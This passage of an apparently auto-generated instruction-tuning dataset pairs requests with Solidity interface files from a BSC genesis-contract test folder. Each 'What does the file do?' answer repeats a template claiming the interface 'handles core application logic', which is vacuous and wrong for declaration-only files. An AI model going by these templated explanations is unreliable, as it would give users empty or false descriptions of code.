spender, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function claim(address payable delegator, uint256 number) external returns (uint256);\n    function claimableUnbondRequest(address delegator) external view returns (uint256);\n    function decimals() external view returns (uint8);\n    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);\n    function delegate(address delegator) external payable returns (uint256 shares);\n    function distributeReward(uint64 commissionRate) external payable;\n    function getPooledBNB(address account) external view returns (uint256);\n    function getPooledBNBByShares(uint256 shares) external view returns (uint256);\n    function getSharesByPooledBNB(uint256 bnbAmount) external view returns (uint256);\n    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);\n    function initialize(address _validator, string memory _moniker) external payable;\n    function lockedBNBs(address delegator, uint256 number) external view returns (uint256);\n    function name() external view returns (string memory);\n    function pendingUnbondRequest(address delegator) external view returns (uint256);\n    function rewardRecord(uint256) external view returns (uint256);\n    function slash(uint256 slashBnbAmount) external returns (uint256);\n    function symbol() external view returns (string memory);\n    function totalPooledBNB() external view returns (uint256);\n    function totalPooledBNBRecord(uint256) external view returns (uint256);\n    function totalSupply() external view returns (uint256);\n    function transfer(address to, uint256 amount) external returns (bool);\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n    function unbond(address delegator, uint256 shares) external returns (uint256 bnbAmount);\n    function unbondRequest(address delegator, uint256 _index) external view returns (UnbondRequest memory);\n    function unbondSequence(address delegator) external view returns (uint256);\n    function undelegate(address delegator, uint256 shares) external returns (uint256 bnbAmount);\n    function validator() external view returns (address);\n}\n\n```"}
{"instruction": "What does the file IStakeCredit.sol do?", "input": "```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface StakeCredit {\n    struct UnbondRequest {\n        uint256 shares;\n        uint256 bnbAmount;\n        uint256 unlockTime;\n    }\n\n    error ApproveNotAllowed();\n    error Empty();\n    error InsufficientBalance();\n    error InvalidValue(string key, bytes value);\n    error NoClaimableUnbondRequest();\n    error NoUnbondRequest();\n    error OnlyCoinbase();\n    error OnlySystemContract(address systemContract);\n    error OnlyZeroGasPrice();\n    error OutOfBounds();\n    error RequestExisted();\n    error TransferFailed();\n    error TransferNotAllowed();\n    error UnknownParam(string key, bytes value);\n    error WrongInitContext();\n    error ZeroAmount();\n    error ZeroShares();\n    error ZeroTotalPooledBNB();\n    error ZeroTotalShares();\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    event Initialized(uint8 version);\n    event ParamChange(string key, bytes value);\n    event RewardReceived(uint256 rewardToAll, uint256 commission);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    receive() external payable;\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function claim(address payable delegator, uint256 number) external returns (uint256);\n    function claimableUnbondRequest(address delegator) external view returns (uint256);\n    function decimals() external view returns (uint8);\n    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);\n    function delegate(address delegator) external payable returns (uint256 shares);\n    function distributeReward(uint64 commissionRate) ex\n```", "output": "This file `IStakeCredit.sol` is part of the interface project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IStakeHub.sol which is part of the interface project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\interface\\IStakeHub.sol`:\n\n```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface StakeHub {\n    type SlashType is uint8;\n    type StakeMigrationRespCode is uint8;\n\n    struct Commission {\n        uint64 rate;\n        uint64 maxRate;\n        uint64 maxChangeRate;\n    }\n\n    struct Description {\n        string moniker;\n        string identity;\n        string website;\n        string details;\n    }\n\n    error AlreadyPaused();\n    error AlreadySlashed();\n    error ConsensusAddressExpired();\n    error DelegationAmountTooSmall();\n    error DuplicateConsensusAddress();\n    error DuplicateMoniker();\n    error DuplicateVoteAddress();\n    error InBlackList();\n    error InvalidCommission();\n    error InvalidConsensusAddress();\n    error InvalidMoniker();\n    error InvalidRequest();\n    error InvalidSynPackage();\n    error InvalidValue(string key, bytes value);\n    error InvalidVoteAddress();\n    error JailTimeNotExpired();\n    error NoMoreFelonyAllowed();\n    error NotPaused();\n    error OnlyCoinbase();\n    error OnlyProtector();\n    error OnlySelfDelegation();\n    error OnlySystemContract(address systemContract);\n    error OnlyZeroGasPrice();\n    error SameValidator();\n    error SelfDelegationNotEnough();\n    error TransferFailed();\n    error UnknownParam(string key, bytes value);\n    error UpdateTooFrequently();\n    error ValidatorExisted();\n    error ValidatorNotExisted();\n    error ValidatorNotJailed();\n    error VoteAddressExpired();\n    error ZeroShares();\n    error InvalidAgent();\n    error InvalidValidator();\n\n    event BlackListed(address indexed target);\n    event Claimed(address indexed operatorAddress, address indexed delegator, uint256 bnbAmount);\n    event CommissionRateEdited(address indexed operatorAddress, uint64 newCommissionRate);\n    event ConsensusAddressEdited(address indexed operatorAddress, address indexed newConsensusAddress);\n    event Delegated(address indexed operatorAddress, address indexed delegator, uint256 shares, uint256 bnbAmount);\n    event DescriptionEdited(address indexed operatorAddress);\n    event Initialized(uint8 version);\n    event MigrateFailed(\n        address indexed operatorAddress, address indexed delegator, uint256 bnbAmount, StakeMigrationRespCode respCode\n    );\n    event MigrateSuccess(address indexed operatorAddress, address indexed delegator, uint256 shares, uint256 bnbAmount);\n    event ParamChange(string key, bytes value);\n    event Paused();\n    event ProtectorChanged(address indexed oldProtector, address indexed newProtector);\n    event Redelegated(\n        address indexed srcValidator,\n        address indexed dstValidator,\n        address indexed delegator,\n        uint256 oldShares,\n        uint256 newShares,\n        uint256 bnbAmount\n    );\n    event Resumed();\n    event RewardDistributeFailed(address indexed operatorAddress, bytes failReason);\n    event RewardDistributed(address indexed operatorAddress, uint256 reward);\n    event StakeCreditInitialized(address indexed operatorAddress, address indexed creditContract);\n    event UnBlackListed(address indexed target);\n    event Undelegated(address indexed operatorAddress, address indexed delegator, uint256 shares, uint256 bnbAmount);\n    event UnexpectedPackage(uint8 channelId, bytes msgBytes);\n    event ValidatorCreated(\n        address indexed consensusAddress,\n        address indexed operatorAddress,\n        address indexed creditContract,\n        bytes voteAddress\n    );\n    event ValidatorEmptyJailed(address indexed operatorAddress);\n    event ValidatorJailed(address indexed operatorAddress);\n    event ValidatorSlashed(\n        address indexed operatorAddress, uint256 jailUntil, uint256 slashAmount, SlashType slashType\n    );\n    event ValidatorUnjailed(address indexed operatorAddress);\n    event VoteAddressEdited(address indexed operatorAddress, bytes newVoteAddress);\n    event AgentChanged(address indexed operatorAddress, address indexed oldAgent, address indexed newAgent);\n    event NodeIDAdded(address indexed validator, bytes32 nodeID);\n    event NodeIDRemoved(address indexed validator, bytes32 nodeID);\n\n    receive() external payable;\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function BREATHE_BLOCK_INTERVAL() external view returns (uint256);\n    function DEAD_ADDRESS() external view returns (address);\n    function LOCK_AMOUNT() external view returns (uint256);\n    function REDELEGATE_FEE_RATE_BASE() external view returns (uint256);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function addToBlackList(address account) external;\n    function blackList(address) external view returns (bool);\n    function claim(address operatorAddress, uint256 requestNumber) external;\n    function claimBatch(address[] memory operatorAddresses, uint256[] memory requestNumbers) external;\n    function consensusExpiration(address) external view returns (uint256);\n    function consensusToOperator(address) external view returns (address);\n    function createValidator(\n        address consensusAddress,\n        bytes memory voteAddress,\n        bytes memory blsProof,\n        Commission memory commission,\n        Description memory description\n    ) external payable;\n    function delegate(address operatorAddress, bool delegateVotePower) external payable;\n    function distributeReward(address consensusAddress) external payable;\n    function doubleSignSlash(address consensusAddress) external;\n    function downtimeJailTime() external view returns (uint256);\n    function downtimeSlash(address consensusAddress) external;\n    function downtimeSlashAmount() external view returns (uint256);\n    function editCommissionRate(uint64 commissionRate) external;\n    function editConsensusAddress(address newConsensusAddress) external;\n    function editDescription(Description memory description) external;\n    function editVoteAddress(bytes memory newVoteAddress, bytes memory blsProof) external;\n    function felonyJailTime() external view returns (uint256);\n    function felonySlashAmount() external view returns (uint256);\n    function getValidatorBasicInfo(address operatorAddress)\n        external\n        view\n        returns (uint256 createdTime, bool jailed, uint256 jailUntil);\n    function getValidatorCommission(address operatorAddress) external view returns (Commission memory);\n    function getValidatorConsensusAddress(address operatorAddress) external view returns (address consensusAddress);\n    function getValidatorCreditContract(address operatorAddress) external view returns (address creditContract);\n    function getValidatorDescription(address operatorAddress) external view returns (Description memory);\n    function getValidatorElectionInfo(\n        uint256 offset,\n        uint256 limit\n    )\n        external\n        view\n        returns (\n            address[] memory consensusAddrs,\n            uint256[] memory votingPowers,\n            bytes[] memory voteAddrs,\n            uint256 totalLength\n        );\n    function getValidatorRewardRecord(address operatorAddress, uint256 index) external view returns (uint256);\n    function getValidatorTotalPooledBNBRecord(address operatorAddress, uint256 index) external view returns (uint256);\n    function getValidatorVoteAddress(address operatorAddress) external view returns (bytes memory voteAddress);\n    function getValidators(\n        uint256 offset,\n        uint256 limit\n    ) external view returns (address[] memory operatorAddrs, address[] memory creditAddrs, uint256 totalLength);\n    function handleAckPackage(uint8 channelId, bytes memory msgBytes) external;\n    function handleFailAckPackage(uint8 channelId, bytes memory msgBytes) external;\n    function handleSynPackage(uint8, bytes memory msgBytes) external returns (bytes memory);\n    function initialize() external;\n    function isPaused() external view returns (bool);\n    function maliciousVoteSlash(bytes memory voteAddress) external;\n    function maxElectedValidators() external view returns (uint256);\n    function maxFelonyBetweenBreatheBlock() external view returns (uint256);\n    function minDelegationBNBChange() external view returns (uint256);\n    function minSelfDelegationBNB() external view returns (uint256);\n    function numOfJailed() external view returns (uint256);\n    function pause() external;\n    function redelegate(address srcValidator, address dstValidator, uint256 shares, bool delegateVotePower) external;\n    function redelegateFeeRate() external view returns (uint256);\n    function removeFromBlackList(address account) external;\n    function resume() external;\n    function syncGovToken(address[] memory operatorAddresses, address account) external;\n    function transferGasLimit() external view returns (uint256);\n    function unbondPeriod() external view returns (uint256);\n    function undelegate(address operatorAddress, uint256 shares) external;\n    function unjail(address operatorAddress) external;\n    function updateParam(string memory key, bytes memory value) external;\n    function voteExpiration(bytes memory) external view returns (uint256);\n    function voteToOperator(bytes memory) external view returns (address);\n\n    function agentToOperator(address) external view returns (address);\n    function updateAgent(address newAgent) external;\n\n    // NodeID management functions\n    function addNodeIDs(bytes32[] calldata newNodeIDs) external;\n    function removeNodeIDs(bytes32[] calldata targetNodeIDs) external;\n    function getNodeIDs(address[] calldata validatorsToQuery) external view returns (address[] memory consensusAddresses, bytes32[][] memory nodeIDsList);\n    function maxNodeIDs() external view returns (uint256);\n}\n\n```"}
{"instruction": "What does the file IStakeHub.sol do?", "input": "```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface StakeHub {\n    type SlashType is uint8;\n    type StakeMigrationRespCode is uint8;\n\n    struct Commission {\n        uint64 rate;\n        uint64 maxRate;\n        uint64 maxChangeRate;\n    }\n\n    struct Description {\n        string moniker;\n        string identity;\n        string website;\n        string details;\n    }\n\n    error AlreadyPaused();\n    error AlreadySlashed();\n    error ConsensusAddressExpired();\n    error DelegationAmountTooSmall();\n    error DuplicateConsensusAddress();\n    error DuplicateMoniker();\n    error DuplicateVoteAddress();\n    error InBlackList();\n    error InvalidCommission();\n    error InvalidConsensusAddress();\n    error InvalidMoniker();\n    error InvalidRequest();\n    error InvalidSynPackage();\n    error InvalidValue(string key, bytes value);\n    error InvalidVoteAddress();\n    error JailTimeNotExpired();\n    error NoMoreFelonyAllowed();\n    error NotPaused();\n    error OnlyCoinbase();\n    error OnlyProtector();\n    error OnlySelfDelegation();\n    error OnlySystemContract(address systemContract);\n    error OnlyZeroGasPrice();\n    error SameValidator();\n    error SelfDelegationNotEnough();\n    error TransferFailed();\n    error UnknownParam(string key, bytes value);\n    error UpdateTooFrequently();\n    error ValidatorExisted();\n    error ValidatorNotExisted();\n    error ValidatorNotJailed();\n    error VoteAddressExpired();\n    error ZeroShares();\n    error InvalidAgent();\n    error InvalidValidator();\n\n    event BlackListed(address indexed target);\n    event Claimed(address indexed operatorAddress, address indexed delegator, uint256 bnbAmount);\n    event CommissionRateEdited(address indexed operatorAddress, uint64 newCommissionRate);\n    event ConsensusAddressEdited(address indexed operatorAddress, address indexed newConsensusAddress);\n    event Delegated(address indexed operatorAddress, address indexed delegator, uint256 shares, uint256 bnbAmount);\n    event Descript\n```", "output": "This file `IStakeHub.sol` is part of the interface project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for IStaking.sol which is part of the interface project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\interface\\IStaking.sol`:\n\n```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface Staking {\n    event crashResponse(uint8 indexed eventType);\n    event delegateFailed(address indexed delegator, address indexed validator, uint256 amount, uint8 errCode);\n    event delegateSubmitted(address indexed delegator, address indexed validator, uint256 amount, uint256 relayerFee);\n    event delegateSuccess(address indexed delegator, address indexed validator, uint256 amount);\n    event failedSynPackage(uint8 indexed eventType, uint256 errCode);\n    event paramChange(string key, bytes value);\n    event redelegateFailed(\n        address indexed delegator, address indexed valSrc, address indexed valDst, uint256 amount, uint8 errCode\n    );\n    event redelegateSubmitted(\n        address indexed delegator,\n        address indexed validatorSrc,\n        address indexed validatorDst,\n        uint256 amount,\n        uint256 relayerFee\n    );\n    event redelegateSuccess(address indexed delegator, address indexed valSrc, address indexed valDst, uint256 amount);\n    event rewardClaimed(address indexed delegator, uint256 amount);\n    event rewardReceived(address indexed delegator, uint256 amount);\n    event undelegateFailed(address indexed delegator, address indexed validator, uint256 amount, uint8 errCode);\n    event undelegateSubmitted(address indexed delegator, address indexed validator, uint256 amount, uint256 relayerFee);\n    event undelegateSuccess(address indexed delegator, address indexed validator, uint256 amount);\n    event undelegatedClaimed(address indexed delegator, uint256 amount);\n    event undelegatedReceived(address indexed delegator, address indexed validator, uint256 amount);\n\n    receive() external payable;\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function BIND_CHANNELID() external view returns (uint8);\n    function CODE_FAILED() external view returns (uint8);\n    function CODE_OK() external view returns (uint32);\n    function CODE_SUCCESS() external view returns (uint8);\n    function CROSS_CHAIN_CONTRACT_ADDR() external view returns (address);\n    function CROSS_STAKE_CHANNELID() external view returns (uint8);\n    function ERROR_FAIL_DECODE() external view returns (uint32);\n    function ERROR_WITHDRAW_BNB() external view returns (uint32);\n    function EVENT_DELEGATE() external view returns (uint8);\n    function EVENT_DISTRIBUTE_REWARD() external view returns (uint8);\n    function EVENT_DISTRIBUTE_UNDELEGATED() external view returns (uint8);\n    function EVENT_REDELEGATE() external view returns (uint8);\n    function EVENT_UNDELEGATE() external view returns (uint8);\n    function GOVERNOR_ADDR() external view returns (address);\n    function GOV_CHANNELID() external view returns (uint8);\n    function GOV_HUB_ADDR() external view returns (address);\n    function GOV_TOKEN_ADDR() external view returns (address);\n    function INCENTIVIZE_ADDR() external view returns (address);\n    function INIT_BSC_RELAYER_FEE() external view returns (uint256);\n    function INIT_MIN_DELEGATION() external view returns (uint256);\n    function INIT_RELAYER_FEE() external view returns (uint256);\n    function INIT_TRANSFER_GAS() external view returns (uint256);\n    function LIGHT_CLIENT_ADDR() external view returns (address);\n    function LOCK_TIME() external view returns (uint256);\n    function RELAYERHUB_CONTRACT_ADDR() external view returns (address);\n    function SLASH_CHANNELID() external view returns (uint8);\n    function SLASH_CONTRACT_ADDR() external view returns (address);\n    function STAKE_CREDIT_ADDR() external view returns (address);\n    function STAKE_HUB_ADDR() external view returns (address);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function STAKING_CONTRACT_ADDR() external view returns (address);\n    function SYSTEM_REWARD_ADDR() external view returns (address);\n    function TEN_DECIMALS() external view returns (uint256);\n    function TIMELOCK_ADDR() external view returns (address);\n    function TOKEN_HUB_ADDR() external view returns (address);\n    function TOKEN_MANAGER_ADDR() external view returns (address);\n    function TOKEN_RECOVER_PORTAL_ADDR() external view returns (address);\n    function TRANSFER_IN_CHANNELID() external view returns (uint8);\n    function TRANSFER_OUT_CHANNELID() external view returns (uint8);\n    function VALIDATOR_CONTRACT_ADDR() external view returns (address);\n    function alreadyInit() external view returns (bool);\n    function bSCRelayerFee() external view returns (uint256);\n    function bscChainID() external view returns (uint16);\n    function claimReward() external returns (uint256 amount);\n    function claimUndelegated() external returns (uint256 amount);\n    function delegate(address, uint256) external payable;\n    function getDelegated(address delegator, address validator) external view returns (uint256);\n    function getDistributedReward(address delegator) external view returns (uint256);\n    function getMinDelegation() external view returns (uint256);\n    function getPendingRedelegateTime(\n        address delegator,\n        address valSrc,\n        address valDst\n    ) external view returns (uint256);\n    function getPendingUndelegateTime(address delegator, address validator) external view returns (uint256);\n    function getRelayerFee() external view returns (uint256);\n    function getRequestInFly(address delegator) external view returns (uint256[3] memory);\n    function getTotalDelegated(address delegator) external view returns (uint256);\n    function getUndelegated(address delegator) external view returns (uint256);\n    function handleAckPackage(uint8, bytes memory msgBytes) external;\n    function handleFailAckPackage(uint8, bytes memory msgBytes) external;\n    function handleSynPackage(uint8, bytes memory msgBytes) external returns (bytes memory);\n    function minDelegation() external view returns (uint256);\n    function redelegate(address, address, uint256) external payable;\n    function relayerFee() external view returns (uint256);\n    function transferGas() external view returns (uint256);\n    function undelegate(address validator, uint256 amount) external payable;\n    function updateParam(string memory key, bytes memory value) external;\n}\n\n```"}
{"instruction": "What does the file IStaking.sol do?", "input": "```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface Staking {\n    event crashResponse(uint8 indexed eventType);\n    event delegateFailed(address indexed delegator, address indexed validator, uint256 amount, uint8 errCode);\n    event delegateSubmitted(address indexed delegator, address indexed validator, uint256 amount, uint256 relayerFee);\n    event delegateSuccess(address indexed delegator, address indexed validator, uint256 amount);\n    event failedSynPackage(uint8 indexed eventType, uint256 errCode);\n    event paramChange(string key, bytes value);\n    event redelegateFailed(\n        address indexed delegator, address indexed valSrc, address indexed valDst, uint256 amount, uint8 errCode\n    );\n    event redelegateSubmitted(\n        address indexed delegator,\n        address indexed validatorSrc,\n        address indexed validatorDst,\n        uint256 amount,\n        uint256 relayerFee\n    );\n    event redelegateSuccess(address indexed delegator, address indexed valSrc, address indexed valDst, uint256 amount);\n    event rewardClaimed(address indexed delegator, uint256 amount);\n    event rewardReceived(address indexed delegator, uint256 amount);\n    event undelegateFailed(address indexed delegator, address indexed validator, uint256 amount, uint8 errCode);\n    event undelegateSubmitted(address indexed delegator, address indexed validator, uint256 amount, uint256 relayerFee);\n    event undelegateSuccess(address indexed delegator, address indexed validator, uint256 amount);\n    event undelegatedClaimed(address indexed delegator, uint256 amount);\n    event undelegatedReceived(address indexed delegator, address indexed validator, uint256 amount);\n\n    receive() external payable;\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function BIND_CHANNELID() external view returns (uint8);\n    function CODE_FAILED() external view returns (uint8);\n    function CODE_OK() external view returns (uint32);\n    function CODE_SUCCESS() extern\n```", "output": "This file `IStaking.sol` is part of the interface project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for ISystem.sol which is part of the interface project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\interface\\ISystem.sol`:\n\n```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface System {\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function BIND_CHANNELID() external view returns (uint8);\n    function CODE_OK() external view returns (uint32);\n    function CROSS_CHAIN_CONTRACT_ADDR() external view returns (address);\n    function CROSS_STAKE_CHANNELID() external view returns (uint8);\n    function ERROR_FAIL_DECODE() external view returns (uint32);\n    function GOVERNOR_ADDR() external view returns (address);\n    function GOV_CHANNELID() external view returns (uint8);\n    function GOV_HUB_ADDR() external view returns (address);\n    function GOV_TOKEN_ADDR() external view returns (address);\n    function INCENTIVIZE_ADDR() external view returns (address);\n    function LIGHT_CLIENT_ADDR() external view returns (address);\n    function RELAYERHUB_CONTRACT_ADDR() external view returns (address);\n    function SLASH_CHANNELID() external view returns (uint8);\n    function SLASH_CONTRACT_ADDR() external view returns (address);\n    function STAKE_CREDIT_ADDR() external view returns (address);\n    function STAKE_HUB_ADDR() external view returns (address);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function STAKING_CONTRACT_ADDR() external view returns (address);\n    function SYSTEM_REWARD_ADDR() external view returns (address);\n    function TIMELOCK_ADDR() external view returns (address);\n    function TOKEN_HUB_ADDR() external view returns (address);\n    function TOKEN_MANAGER_ADDR() external view returns (address);\n    function TOKEN_RECOVER_PORTAL_ADDR() external view returns (address);\n    function TRANSFER_IN_CHANNELID() external view returns (uint8);\n    function TRANSFER_OUT_CHANNELID() external view returns (uint8);\n    function VALIDATOR_CONTRACT_ADDR() external view returns (address);\n    function alreadyInit() external view returns (bool);\n    function bscChainID() external view returns (uint16);\n}\n\n```"}
{"instruction": "What does the file ISystem.sol do?", "input": "```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface System {\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function BIND_CHANNELID() external view returns (uint8);\n    function CODE_OK() external view returns (uint32);\n    function CROSS_CHAIN_CONTRACT_ADDR() external view returns (address);\n    function CROSS_STAKE_CHANNELID() external view returns (uint8);\n    function ERROR_FAIL_DECODE() external view returns (uint32);\n    function GOVERNOR_ADDR() external view returns (address);\n    function GOV_CHANNELID() external view returns (uint8);\n    function GOV_HUB_ADDR() external view returns (address);\n    function GOV_TOKEN_ADDR() external view returns (address);\n    function INCENTIVIZE_ADDR() external view returns (address);\n    function LIGHT_CLIENT_ADDR() external view returns (address);\n    function RELAYERHUB_CONTRACT_ADDR() external view returns (address);\n    function SLASH_CHANNELID() external view returns (uint8);\n    function SLASH_CONTRACT_ADDR() external view returns (address);\n    function STAKE_CREDIT_ADDR() external view returns (address);\n    function STAKE_HUB_ADDR() external view returns (address);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function STAKING_CONTRACT_ADDR() external view returns (address);\n    function SYSTEM_REWARD_ADDR() external view returns (address);\n    function TIMELOCK_ADDR() external view returns (address);\n    function TOKEN_HUB_ADDR() external view returns (address);\n    function TOKEN_MANAGER_ADDR() external view returns (address);\n    function TOKEN_RECOVER_PORTAL_ADDR() external view returns (address);\n    function TRANSFER_IN_CHANNELID() external view returns (uint8);\n    function TRANSFER_OUT_CHANNELID() external view returns (uint8);\n    function VALIDATOR_CONTRACT_ADDR() external view returns (address);\n    function alreadyInit() external view returns (bool);\n    function bscChainID() external view returns (uint16);\n}\n\n```", "output": "This file `ISystem.sol` is part of the interface project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for ISystemReward.sol which is part of the interface project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\interface\\ISystemReward.sol`:\n\n```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface SystemReward {\n    event addOperator(address indexed operator);\n    event deleteOperator(address indexed operator);\n    event paramChange(string key, bytes value);\n    event receiveDeposit(address indexed from, uint256 amount);\n    event rewardEmpty();\n    event rewardTo(address indexed to, uint256 amount);\n\n    receive() external payable;\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function BIND_CHANNELID() external view returns (uint8);\n    function CODE_OK() external view returns (uint32);\n    function CROSS_CHAIN_CONTRACT_ADDR() external view returns (address);\n    function CROSS_STAKE_CHANNELID() external view returns (uint8);\n    function ERROR_FAIL_DECODE() external view returns (uint32);\n    function GOVERNOR_ADDR() external view returns (address);\n    function GOV_CHANNELID() external view returns (uint8);\n    function GOV_HUB_ADDR() external view returns (address);\n    function GOV_TOKEN_ADDR() external view returns (address);\n    function INCENTIVIZE_ADDR() external view returns (address);\n    function LIGHT_CLIENT_ADDR() external view returns (address);\n    function MAX_REWARDS() external view returns (uint256);\n    function RELAYERHUB_CONTRACT_ADDR() external view returns (address);\n    function SLASH_CHANNELID() external view returns (uint8);\n    function SLASH_CONTRACT_ADDR() external view returns (address);\n    function STAKE_CREDIT_ADDR() external view returns (address);\n    function STAKE_HUB_ADDR() external view returns (address);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function STAKING_CONTRACT_ADDR() external view returns (address);\n    function SYSTEM_REWARD_ADDR() external view returns (address);\n    function TIMELOCK_ADDR() external view returns (address);\n    function TOKEN_HUB_ADDR() external view returns (address);\n    function TOKEN_MANAGER_ADDR() external view returns (address);\n    function TOKEN_RECOVER_PORTAL_ADDR() external view returns (address);\n    function TRANSFER_IN_CHANNELID() external view returns (uint8);\n    function TRANSFER_OUT_CHANNELID() external view returns (uint8);\n    function VALIDATOR_CONTRACT_ADDR() external view returns (address);\n    function alreadyInit() external view returns (bool);\n    function bscChainID() external view returns (uint16);\n    function claimRewards(address payable to, uint256 amount) external returns (uint256);\n    function isOperator(address addr) external view returns (bool);\n    function numOperator() external view returns (uint256);\n    function updateParam(string memory key, bytes memory value) external;\n}\n\n```"}
{"instruction": "What does the file ISystemReward.sol do?", "input": "```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface SystemReward {\n    event addOperator(address indexed operator);\n    event deleteOperator(address indexed operator);\n    event paramChange(string key, bytes value);\n    event receiveDeposit(address indexed from, uint256 amount);\n    event rewardEmpty();\n    event rewardTo(address indexed to, uint256 amount);\n\n    receive() external payable;\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function BIND_CHANNELID() external view returns (uint8);\n    function CODE_OK() external view returns (uint32);\n    function CROSS_CHAIN_CONTRACT_ADDR() external view returns (address);\n    function CROSS_STAKE_CHANNELID() external view returns (uint8);\n    function ERROR_FAIL_DECODE() external view returns (uint32);\n    function GOVERNOR_ADDR() external view returns (address);\n    function GOV_CHANNELID() external view returns (uint8);\n    function GOV_HUB_ADDR() external view returns (address);\n    function GOV_TOKEN_ADDR() external view returns (address);\n    function INCENTIVIZE_ADDR() external view returns (address);\n    function LIGHT_CLIENT_ADDR() external view returns (address);\n    function MAX_REWARDS() external view returns (uint256);\n    function RELAYERHUB_CONTRACT_ADDR() external view returns (address);\n    function SLASH_CHANNELID() external view returns (uint8);\n    function SLASH_CONTRACT_ADDR() external view returns (address);\n    function STAKE_CREDIT_ADDR() external view returns (address);\n    function STAKE_HUB_ADDR() external view returns (address);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function STAKING_CONTRACT_ADDR() external view returns (address);\n    function SYSTEM_REWARD_ADDR() external view returns (address);\n    function TIMELOCK_ADDR() external view returns (address);\n    function TOKEN_HUB_ADDR() external view returns (address);\n    function TOKEN_MANAGER_ADDR() external view returns (address);\n    function TOKEN_RECOVER_PORT\n```", "output": "This file `ISystemReward.sol` is part of the interface project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for ITendermintLightClient.sol which is part of the interface project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\interface\\ITendermintLightClient.sol`:\n\n```sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\ninterface TendermintLightClient {\n    event initConsensusState(uint64 initHeight, bytes32 appHash);\n    event paramChange(string key, bytes value);\n    event syncConsensusState(uint64 height, uint64 preValidatorSetChangeHeight, bytes32 appHash, bool validatorChanged);\n\n    function BC_FUSION_CHANNELID() external view returns (uint8);\n    function BIND_CHANNELID() external view returns (uint8);\n    function CODE_OK() external view returns (uint32);\n    function CROSS_CHAIN_CONTRACT_ADDR() external view returns (address);\n    function CROSS_STAKE_CHANNELID() external view returns (uint8);\n    function ERROR_FAIL_DECODE() external view returns (uint32);\n    function GOVERNOR_ADDR() external view returns (address);\n    function GOV_CHANNELID() external view returns (uint8);\n    function GOV_HUB_ADDR() external view returns (address);\n    function GOV_TOKEN_ADDR() external view returns (address);\n    function INCENTIVIZE_ADDR() external view returns (address);\n    function INIT_CONSENSUS_STATE_BYTES() external view returns (bytes memory);\n    function INIT_REWARD_FOR_VALIDATOR_SER_CHANGE() external view returns (uint256);\n    function LIGHT_CLIENT_ADDR() external view returns (address);\n    function RELAYERHUB_CONTRACT_ADDR() external view returns (address);\n    function SLASH_CHANNELID() external view returns (uint8);\n    function SLASH_CONTRACT_ADDR() external view returns (address);\n    function STAKE_CREDIT_ADDR() external view returns (address);\n    function STAKE_HUB_ADDR() external view returns (address);\n    function STAKING_CHANNELID() external view returns (uint8);\n    function STAKING_CONTRACT_ADDR() external view returns (address);\n    function SYSTEM_REWARD_ADDR() external view returns (address);\n    function TIMELOCK_ADDR() external view returns (address);\n    function TOKEN_HUB_ADDR() external view returns (address);\n    function TOKEN_MANAGER_ADDR() external view returns (address);\n    function TOKEN_RECOVER_PORTAL_ADDR() external view returns (address);\n    function TRANSFER_IN_CHANNELID() external view returns (uint8);\n    function TRANSFER_OUT_CHANNELID() external view returns (uint8);\n    function VALIDATOR_CONTRACT_ADDR() external view returns (address);\n    function alreadyInit() external view returns (bool);\n    function bscChainID() external view returns (uint16);\n    function chainID() external view returns (bytes32);\n    function getAppHash(uint64 height) external view returns (bytes32);\n    function getChainID() external view returns (string memory);\n    function getSubmitter(uint64 height) external view returns (address payable);\n    function init() external;\n    function initialHeight() external view returns (uint64);\n    function isHeaderSynced(uint64 height) external view returns (bool);\n    function latestHeight() external view returns (uint64);\n    function lightClientConsensusStates(uint64)\n        external\n        view\n        returns (\n            uint64 